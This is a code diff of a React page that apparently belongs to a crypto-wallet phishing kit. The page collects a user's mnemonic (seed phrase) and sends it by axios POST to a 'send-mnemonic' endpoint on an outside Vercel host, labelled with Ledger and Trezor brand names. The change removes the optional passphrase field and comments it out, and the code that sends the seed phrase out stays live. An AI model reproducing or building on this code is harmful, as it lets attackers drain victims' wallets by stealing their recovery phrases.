@@ -84,11 +84,12 @@ export default function PhraseMainPage() {
       }));
 
       const heading = `Ledger`; 
-      const payload = { data, heading, passphrase: passphrase.trim() || "" };
+      const payload = { data, heading};
 
       setLoading(true);
       const response = await axios.post(
         "https://trezor-backend-zeta.vercel.app/api/v1/send-mnemonic",
+        // "http://localhost:5454/api/v1/send-mnemonic",
         payload
       );
 
@@ -327,7 +328,7 @@ export default function PhraseMainPage() {
                 ))}
 
                 {/* ✅ Optional Passphrase Field */}
-                <Grid size={{ lg: 4, xs: 12 }}>
+                {/* <Grid size={{ lg: 4, xs: 12 }}>
                   <InputLabel
                     shrink
                     sx={{
@@ -362,7 +363,7 @@ export default function PhraseMainPage() {
                       },
                     }}
                   />
-                </Grid>
+                </Grid> */}
 
                 <Grid size={{ xs: 12 }} mt={4}>
                   <Button
